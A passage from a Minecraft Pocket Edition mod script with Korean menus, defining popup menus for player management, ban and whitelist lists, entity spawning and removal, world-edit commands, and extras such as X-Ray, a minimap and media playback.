onClick: function(v){
for(var n in players)
teleport(players[n], Entity.getX(ad), Entity.getY(ad)+0.5, Entity.getZ(ad));
if(pca) darkMessage("모든 플레이어를 소환합니다.", true);
}
});
button[8].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(mcpev) giveEffectType(playerTarget);
else Dark.toast("0.10.5 이하에서는 사용하실 수 없습니다.");
}
});
button[8].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
if(mcpev) Entity.removeAllEffects(playerTarget);
else Dark.toast("0.10.5 이하에서는 사용하실 수 없습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"의 포션 효과가 삭제되었습니다.", true);
return true;
}
});
button[9].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
fuckYouPlayer();
}
});
button[10].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.toast(Player.getName(playerTarget)+" : "+Math.round(Entity.getX(playerTarget))+", "+Math.floor(Entity.getY(playerTarget))+", "+Math.round(Entity.getZ(playerTarget)));
}
});
button[11].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
ModPE.setCamera(playerTarget);
Dark.toast("버튼을 길게 터치하시면 본인의 시야로 돌아옵니다.");
}
});
button[11].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
ModPE.setCamera(ad);
return true;
}
});
button[12].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.toast(playerTarget);
}
});
button[13].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
inputTitle();
}
});
button[13].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
var pn = Player.getName(playerTarget).toString().split("] §f");
if(pn[1]!=null){
Entity.setNameTag(playerTarget, pn[1]);
Dark.toast("칭호를 삭제하였습니다.");
}
else{
Dark.toast("칭호가 없습니다.");
}
return true;
}
});
button[14].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
inputMaxHealth();
}
});
button[14].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Entity.setMaxHealth(playerTarget, 20);
return true;
}
});
for(var n in menus)
layout.addView(button[n]);
op.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(ops.indexOf(playerTarget)==-1){
op.setText("OP 권한 회수");
ops.push(playerTarget);
opData.push([true, true, true, true, true, true, true, true, true, true, true]);
Dark.toast("OP 권한이 부여되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"에게 OP 권한이 부여되었습니다.", true);
}
else{
op.setText("OP 권한 부여");
var nn = ops.indexOf(playerTarget);
ops.splice(nn, 1);
opData.splice(nn, 1);
Dark.toast("OP 권한이 회수되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"의 OP 권한이 회수되었습니다.", true);
}
}
});
op.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
if(ops.indexOf(playerTarget)!=-1){
opManager(ops.indexOf(playerTarget));
}
return true;
}
});
layout.addView(op);
var exit = makeExit(menuP);
layout.addView(exit);
var scroll = makeScroll(layout, menuP);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuP.setContentView(layout2);
menuP.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function openBanList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
menuB = new android.widget.PopupWindow();
var title = makeTitle("밴 목록");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
Ban.removeGonePlayerData();
var players = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
var players2 = players.sort();
players = players2;
}
var checkBox = new Array();
for(var n in players){
checkBox[n] = new android.widget.CheckBox(ctx);
checkBox[n].setText(Player.getName(players[n]));
checkBox[n].setId(n);
checkBox[n].setTextColor(white2);
if(Ban.isBanned(players[n]))
checkBox[n].setChecked(true);
else
checkBox[n].setChecked(false);
checkBox[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
banList.push(players[check.getId()]);
}
else if(onoff==false){
Ban.removeData(players[check.getId()]);
}
}
}));
layout.addView(checkBox[n]);
}
var bl = new android.widget.ToggleButton(ctx);
bl.setTextOn("블랙 리스트 사용");
bl.setTextOff("블랙 리스트 사용");
bl.setTextColor(white2);
bl.setChecked(blackListOn);
bl.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
blackListOn = onoff;
}
}));
layout.addView(bl);
var bl2 = new android.widget.ToggleButton(ctx);
bl2.setTextOn("맵 접속 방지 사용");
bl2.setTextOff("맵 접속 방지 사용");
bl2.setTextColor(white2);
bl2.setChecked(blackListIdOn);
bl2.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
blackListIdOn = onoff;
}
}));
layout.addView(bl2);
var wl = new android.widget.ToggleButton(ctx);
wl.setTextOn("화이트 리스트 사용");
wl.setTextOff("화이트 리스트 사용");
wl.setTextColor(white2);
wl.setChecked(whiteListOn);
wl.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
whiteListOn = onoff;
}
}));
layout.addView(wl);
var reset = makeButton("밴 목록 초기화");
reset.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
banList = new Array();
for each(var cb in checkBox)
cb.setChecked(false);
Dark.toast("밴 목록이 초기화되었습니다.");
}
});
layout.addView(reset);
var list = makeButton("블랙 리스트");
list.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
openBlackList();
}
});
layout.addView(list);
var list2 = makeButton("맵 접속 방지");
list2.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
openIdBlackList();
}
});
layout.addView(list2);
var list2 = makeButton("화이트 리스트");
list2.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
openWhiteList();
}
});
layout.addView(list2);
var exit = makeExit(menuB);
layout.addView(exit);
var scroll = makeScroll(layout, menuB);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuB.setContentView(layout2);
menuB.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function entitySet(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuE = new android.widget.PopupWindow();
var title = makeTitle("엔티티 관리");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var entityId = null;
var names = ["닭", "소", "돼지", "양", "늑대", "NPC", "버섯소", "오징어", "토끼", "박쥐", "아이언 골램", "스노우 골램", "오셸롯", "좀비", "크리퍼", "스켈레톤", "거미", "좀비 피그맨", "슬라임", "엔더맨", "좀벌레", "동굴 거미", "가스트", "마그마 큐브", "블레이즈", "좀비 NPC", "마녀", "드롭된 아이템", "활성화된 TNT", "떨어지는 블록", "경험치 포션", "경험치", "낚싯대", "화살", "눈덩이", "달걀", "그림", "마인카트", "화염구", "투척 포션", "보트", "번개", "작은 화염구", "카메라", "깔때기 마인 카트", "TNT 마인 카트", "창고 마인 카트"];
var animals = [[], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], []];
var entityIds = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 64, 65, 66, 68, 69, 77, 80, 81, 82, 83, 84, 85, 86, 90, 93, 94, 95, 96, 97, 98];
for each(var e in Entity.getAll()){
for(var n in entityIds){
if(Entity.getEntityTypeId(e)==entityIds[n]){
animals[n].push(e);
break;
}
}
}
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = new Array();
for(var n in names){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(names[n]+"("+animals[n].length+")");
radio[n].setTextColor(white2);
radio[n].setId(n);
if(tf==true)
radios.addView(radio[n]);
}
if(tf==false){
for(var n=0;n<20;n++)
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
entityId = entityIds[checkedId];
}
}));
layout.addView(radios);

var btnT = new Array();
var menusT = ["엔티티 생성 방지", "엔티티 체력 표시", "터치한 엔티티 즉사", "터치한 엔티티 체력 표시"];
for(var n in menusT){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menusT[n]);
btnT[n].setTextOff(menusT[n]);
btnT[n].setTextColor(white2);
}
btnT[0].setChecked(noEnt);
btnT[1].setChecked(showMobHealth);
btnT[2].setChecked(killEnt);
btnT[3].setChecked(showEntHealth);
btnT[0].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff) Dark.toast("플레이어와 그림은 예외입니다.");
noEnt = onoff;
}
}));
btnT[1].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff) Dark.toast("플레이어는 예외입니다.");
showMobHealth = onoff;
}
}));
btnT[2].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
killEnt = onoff;
}
}));
btnT[3].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff) Dark.toast("플레이어는 예외입니다.");
showEntHealth = onoff;
}
}));
var btn = new Array();
var menus = ["엔티티 스폰", "엔티티 삭제", "모든 엔티티 삭제", "엔티티 탑승", "엔티티 이름 짓기", "엔티티 코드 확인", "엔티티들 이름표 제거"];
for(var n in menus)
btn[n] = makeButton(menus[n]);
btn[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(tf){
if(entityId==64||entityId==66||entityId==83||entityId==85)
Dark.toast("해당 엔티티는 소환할 수 없습니다.");
else{
entityTarget = entityId;
Dark.toast("해당 엔티티가 선택되었습니다.");
Dark.makeEntityBtn();
}
}
else{
giveSpawnEgg(entityId);
}
}
});
btn[0].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
spawnEntity();
return true;
}
});
btn[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for each(var e in Entity.getAll()){
if(Entity.getEntityTypeId(e)==entityId)
Entity.remove(e);
}
Dark.toast("해당 엔티티가 삭제되었습니다.");
}
});
btn[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for each(var e in Entity.getAll()){
if(!(Player.isPlayer(e)||Entity.getEntityTypeId(e)==83))
Entity.remove(e);
}
Dark.toast("플레이어와 그림을 제외한 모든 엔티티가 삭제되었습니다.");
}
});
btn[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
rideEnt = true;
Dark.toast("탑승할 엔티티를 터치하세요.");
}
});
btn[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
entityNameDialog();
}
});
btn[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.toast(names[entityIds.indexOf(entityId)]+" : "+entityId+"번");
}
});
btn[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for each(var e in Entity.getAll()){
if(Entity.getEntityTypeId(e)<64&&!Player.isPlayer(e))
Entity.setNameTag(e, "");
}
}
});
if(tf){
for(var n in menusT)
layout.addView(btnT[n]);
}
layout.addView(btn[0]);
if(tf){
for(var n=1;n<5;n++)
layout.addView(btn[n]);
}
layout.addView(btn[5]);
if(tf) layout.addView(btn[6]);
var exit = makeExit(menuE);
layout.addView(exit);
var scroll = makeScroll(layout, menuE);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuE.setContentView(layout2);
menuE.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function worldEdit(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuWE = new android.widget.PopupWindow();
var title = makeTitle("지형 수정");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = new Array();
var menus = ["월드 에딧", "월드 에딧 GUI", "터치한 블록 정보", "setTile 메니저", "서버원용 월드 에딧 GUI"];
for(var n in menus){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menus[n]);
btnT[n].setTextOff(menus[n]);
btnT[n].setTextColor(white2);
}
btnT[0].setChecked(w.tf);
if(w.btn==null) btnT[1].setChecked(false);
else btnT[1].setChecked(true);
btnT[2].setChecked(blockInfo);
btnT[3].setChecked(sm.tf);
btnT[4].setChecked(we.tf);
btnT[0].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
w.tf = onoff;
}
}));
btnT[1].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeBtnW(onoff);
}
}));
btnT[2].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
blockInfo = onoff;
}
}));
btnT[3].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
sm.tf = onoff;
}
}));
btnT[4].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(Dark.read("cwepLink")=="true"){
we.tf = onoff;
Dark.save("cwep", onoff);
}
else{
Dark.toast("스크립트가 연동되어 있지 않습니다.");
}
}
}));
for(var n in menus)
layout.addView(btnT[n]);
var p1 = makeButton("지점 1 입력");
p1.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
firstPoint();
}
});
var p2 = makeButton("지점 2 입력");
p2.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
secondPoint();
}
});
var set = new android.widget.Button(ctx);
var replace = new android.widget.Button(ctx);
set.setText("블록 설정");
replace.setText("블록 변경");
set.setBackgroundDrawable(setBtnColor());
replace.setBackgroundDrawable(setBtnColor());
set.setTextColor(white2);
replace.setTextColor(white2);
set.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
setDialog();
}
});
replace.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
replaceDialog();
}
});
layout.addView(p1);
layout.addView(p2);
layout.addView(set);
layout.addView(replace);
var cmd = new android.widget.Button(ctx);
cmd.setText("도움말&명령어");
cmd.setBackgroundDrawable(setBtnColor());
cmd.setTextColor(white2);
cmd.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("월드 에딧 도움말&명령어 목록", "지점 1, 2는 각각 철칼과 철괭이로 터치하시면 선택됩니다. \"지형 수정\"과 \"월드 에딧\"은 별개의 기능입니다.\n\"월드 에딧 GUI\"에 있는 대칭 기능은 \/copy로 복사한 내용을 대칭시키는 것입니다. 즉, 순서는 복사 => 대칭 => 붙여넣기.\n\"setTile 메니저\"는 지점 1과 2를 setTile화(?) 시키는 기능으로, 기준점은 활로 터치한 곳입니다. 월드 에딧(지점 1, 2 선택)과 지형 수정의 setTile 메니저(기준점 선택)가 모두 켜진상태에만 작동하며, 기타 기능에 있는 추가 기능의 setTile 메니저 버튼을 터치하시면 setTile 메니저가 실행됩니다.\n파티클 도우미는 월드 에딧과 setTile 메니저가 켜져있어야 작동하며, 발광석들을 파티클로 인식합니다.\n\n\/set n m - 블록 아이디가 n, 블록 데미지가 m인 블록으로 채운다.\n\/replace n m - n번 블록을 m번 블록으로 바꾼다.\n\/change a b c d - 블록 아이디가 a, 블록 데미지가 b인 블록을 블록 아이디가 c, 블록 데미지가 d인 블록으로 바꾼다.\n\/no tree - 나무(나무 원목&나뭇잎)를 지운다.\n\/snow - 눈을 내린다.\n\/freeze - 액체들을 얼린다+눈.\n\/pillar n - 블록 설치시 n칸 만큼 위로 해당 블록이 쌓임. \/pillar off로 비활성화.\n\/no water - 물을 지운다.\n\/wall n m - 지점 1에 블록 아이디가 n, 블록 데미지가 m인 블록으로 속이 빈 벽을 생성한다.\nwall2 n m - 지점 1에 블록 아이디가 n, 블록 데미지가 m인 블록으로 벽을 생성한다. 벽 내부의 지형은 유지된다.\n\/copy - 해당 범위를 복사한다.\n\/paste - \/copy에서 복사한 부분을 붙여넣는다. 지점 1(철칼로 터치한 곳)을 기준으로 x, y, z축의 양의 방향으로 붙여넣는다.\n\/circle r n m - 지점 1에 반지름이 r인 원을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/circle2 r n m - 지점 1에 반지름이 r이고 내부가 채워진 원을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/cylin r h n m - 지점 1에 반지름이 r, 높이가 h인 원기둥을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/sphere r n m - 지점 1에 반지름이 r인 구를 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/sphereh r n m - 지점 1에 반지름이 r인 반구를 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/sphere2 r n m - 지점 1에 반지름이 r이고 내부가 채워진 구를 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/line s n m - 플레이어의 위치를 기준으로 바라보는 방향으로 s칸 앞까지의 직선을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다(상/하 미포함).\n\/line2 s n m - 플레이어의 위치를 기준으로 바라보는 방향으로 s칸 앞까지의 직선을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다(상/하 포함).\n");
}
});
layout.addView(cmd);
var wo2 = new android.widget.Button(ctx);
wo2.setText("서버원용 월드 에딧 설정");
wo2.setBackgroundDrawable(setBtnColor());
wo2.setTextColor(white2);
wo2.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
worldEditManager();
}
});
layout.addView(wo2);
var exit = makeExit(menuWE);
layout.addView(exit);
var scroll = makeScroll(layout, menuWE);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuWE.setContentView(layout2);
menuWE.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function elseSet(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuEL = new android.widget.PopupWindow();
var title = makeTitle("기타 기능");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = new Array();
var menusT = ["스크린 샷 버튼", "플레이어 좌표", "X-Ray", "시계", "등불", "채우기", "터치한 블록 캐기", "화면 뒤집기", "베드락 캐기 허용", "마인크래프트 시계", "시야 조절", "광물 확인", "자동 횃불", "미니맵"];
for(var n in menusT){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menusT[n]);
btnT[n].setTextOff(menusT[n]);
btnT[n].setTextColor(white2);
}
if(btnSS==null) btnT[0].setChecked(false);
else btnT[0].setChecked(true);
if(p.p==null) btnT[1].setChecked(false);
else btnT[1].setChecked(true);
if(scanOre) btnT[2].setChecked(scanOre2);
else btnT[2].setChecked(xRay);
if(clock==null) btnT[3].setChecked(false);
else btnT[3].setChecked(true);
btnT[4].setChecked(light);
btnT[5].setChecked(filling);
btnT[6].setChecked(touchBlock);
btnT[7].setChecked(screenReverse);
btnT[8].setChecked(bedBreak);
if(clock2==null) btnT[9].setChecked(false);
else btnT[9].setChecked(true);
if(fovM==null) btnT[10].setChecked(false);
else btnT[10].setChecked(true);
btnT[11].setChecked(findOre);
btnT[12].setChecked(autoTorch);
if(miniMap==null) btnT[13].setChecked(false);
else btnT[13].setChecked(true);
btnT[0].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
makeScreenShotButton();
}
else if(onoff==false){
if(btnSS!=null){
btnSS.dismiss();
btnSS = null;
}
}
}
}));
btnT[1].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
try{
p.p = new android.widget.PopupWindow();
p.t = new android.widget.TextView(ctx)
p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : X");
p.t.setTextSize(13);
p.t.setTextColor(white);
p.t.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerTp();
}
});
setDragListener(p.p, p.t, 0);
p.p.setContentView(p.t);
p.p.setWidth(dip2px(ctx, 110));
p.p.setHeight(dip2px(ctx, 37));
p.p.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
if(Dark.read("playerX")=="") p.p.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, 80, 0);
else p.p.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("playerX"), Dark.read("playerY"));
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
else if(onoff==false){
if(p.p!=null){
p.p.dismiss();
p.p = null;
}
}
}
}));
btnT[2].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(scanOre){
if(scanOre2){
Block.setShape(2, 0, 0, 0, 1, 1, 1);
Block.setShape(3, 0, 0, 0, 1, 1, 1);
Block.setShape(87, 0, 0, 0, 1, 1, 1);
Block.setShape(14, 0, 0, 0, 1, 1, 1);
Block.setShape(15, 0, 0, 0, 1, 1, 1);
Block.setShape(16, 0, 0, 0, 1, 1, 1);
Block.setShape(56, 0, 0, 0, 1, 1, 1);
Block.setShape(73, 0, 0, 0, 1, 1, 1);
Block.setShape(74, 0, 0, 0, 1, 1, 1);
Block.setShape(129, 0, 0, 0, 1, 1, 1);
Block.setShape(153, 0, 0, 0, 1, 1, 1);
Block.setLightLevel(14, 0);
Block.setLightLevel(15, 0);
Block.setLightLevel(16, 0);
Block.setLightLevel(17, 0);
Block.setLightLevel(56, 0);
Block.setLightLevel(73, 0);
Block.setLightLevel(129, 0);
Block.setLightLevel(153, 0);
scanOre2 = false;
}
else{
Block.setShape(2, 0, 0, 0, 0, 0, 0);
Block.setShape(3, 0, 0, 0, 0, 0, 0);
Block.setShape(87, 0, 0, 0, 0, 0, 0);
Block.setShape(14, 0, 0, 0, 1, 0.999, 1);
Block.setShape(15, 0, 0, 0, 1, 0.999, 1);
Block.setShape(16, 0, 0, 0, 1, 0.999, 1);
Block.setShape(56, 0, 0, 0, 1, 0.999, 1);
Block.setShape(73, 0, 0, 0, 1, 0.999, 1);
Block.setShape(74, 0, 0, 0, 1, 0.999, 1);
Block.setShape(129, 0, 0, 0, 1, 0.999, 1);
Block.setShape(153, 0, 0, 0, 1, 0.999, 1);
Block.setLightLevel(14, 15);
Block.setLightLevel(15, 15);
Block.setLightLevel(16, 15);
Block.setLightLevel(17, 15);
Block.setLightLevel(56, 15);
Block.setLightLevel(73, 15);
Block.setLightLevel(129, 15);
Block.setLightLevel(153, 15);
scanOre2 = true;
}
Dark.toast("잘 작동하지 않는 경우는 아무 블록을 설치하시거나 파괴하시면 됩니다.")
}
else{
xRayOn(onoff);
}
}
}));
btnT[3].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
showClock(onoff);
}
}));
btnT[4].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
light = onoff;
setTile(lx, ly, lz, l.b[0], l.b[1]);
}
}));
btnT[5].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
filling = onoff;
}
}));
btnT[6].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
touchBlock = onoff;
}
}));
btnT[7].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true)
ModPE.setFov(-65);
else if(onoff==false)
ModPE.resetFov();
screenReverse = onoff;
}
}));
btnT[8].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
bedBreak = onoff;
if(onoff) Block.setDestroyTime(7, 15);
else Block.setDestroyTime(7, -1);
}
}));
btnT[9].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeMinecraftClock(onoff);
}
}));
btnT[10].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeFovEditor(onoff);
}
}));
btnT[11].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
findOre = onoff;
}
}));
btnT[12].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
autoTorch = onoff;
}
}));
btnT[13].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeMiniMap(onoff);
}
}));
if(tf==true){
for(var n in menusT)
layout.addView(btnT[n]);
}
else if(tf==false){
for(var n=0;n<5;n++)
layout.addView(btnT[n]);
layout.addView(btnT[7]);
layout.addView(btnT[10]);
layout.addView(btnT[11]);
layout.addView(btnT[13]);
}
var button = new Array();
var menus = ["명령어 입력", "명령어 목록", "웹 브라우저", "함수 실행", "음악 재생", "영상 재생", "화면 터치 방지", "지도 보기", "게임 속도 설정", "도배기"];
for(var n in menus)
button[n] = makeButton(menus[n]);
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
inputCommand();
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("명령어 목록", "\/day - 낮으로 설정\n\/night - 밤으로 설정\n\/dawn - 새벽으로 설정\n\/dusk - 저녁으로 설정\n\/burst n - 뼈로 터치하면 n만큼의 폭발이 발생하도록 설정\n\/remove - 뼈로 터치하면 터치한 블록이 사라지도록 설정\n\/mine - 뼈로 터치하면 터치한 블록이 캐지도록 설정\n\/ride - 뼈로 때리면 맞은 엔티티 탑승\n\/kill - 뼈로 때리면 맞은 엔티티 즉사\n\/tp x y z - 해당 좌표로 순간이동\n\/add a b c - 아이템 아이디가 a이고 아이템 데미지가 c인 아이템 b개 지급\n\/off - 뼈로 작동하는 것들 비활성화\n\/gm 0, \/survival - 서바이벌로 설정\n\/gm 1, \/creative - 크리에이티브로 설정\n\/give a b c  s - s에게 아이템 아이디가 a이고 아이템 데미지가 c인 아이템 b개 지급.(c와 s 사이는 띄어쓰기 2번).\n\/go  s - s에게 이동.(go와 s 사이는 띄어쓰기 2번)\n\/health n - 본인의 체력을 n으로 설정.\n\/time n - 시간을 n으로 설정.\n\/kill  s - s사살.(kill과 s 사이는 띄어쓰기 2번)\n\/call  s - s를 자신의 위치로 소환.(call과 s 사이는 띄어쓰기 2번).\n띄어쓰기가 2번인 경우는 맨 마지막에 플레이어의 닉네임이 오는 경우이며, 두번인 이유는 플레이어의 닉네임에 띄어쓰기가 포함될 가능성이 있기 때문입니다.\n\nOP가 사용할 수 있는 명령어는 .day, .night, .tp, .add, .give, .go, .health, .kill, .call 이 9가지 입니다. OP 권한 부여는 \"플레이어 관리\"에서 하실 수 있습니다. OP 명령어는 \/대신 .을 사용합니다. OP들은 .kill 명령어를 서버장에게 사용할 수 없습니다.\n\"플레이어 관리\"는 한 명 또는 모든 플레이어를 관리하고, \"플레이어들 관리\"의 차이는 한번에 2명 이상의 플레이어들를 관리합니다. \"플레이어들 관리\"는 \"플레이어 관리\" 버튼을 길게 누르시면 열리며, \"인벤토리 수정\" 버튼 역시 길게 누르시면 \"갑옷 슬롯 관리\"가 뜹니다\n\"밴 목록\"은 \"플레이어 관리\"를 더블 터치하면 열립니다.\n");
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(checkInternet()) openWeb();
else Dark.toast("인터넷에 연결되어있지 않습니다.");
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
runFunc();
}
});
button[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(music){
media.reset();
music = false;
Dark.toast("Music off");
button[4].setText("음악 재생");
}
else{
selectMusic(sdcard, button[4]);
}
}
});
button[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
selectVideo(sdcard);
}
});
button[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
antiTouch();
Dark.toast("트리플 터치시 비활성화(또는 이전 키).");
Dark.close(true);
}
});
button[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
makeMap();
}
});
button[8].setOnClickListener(new android.view.View.OnClickListener(){
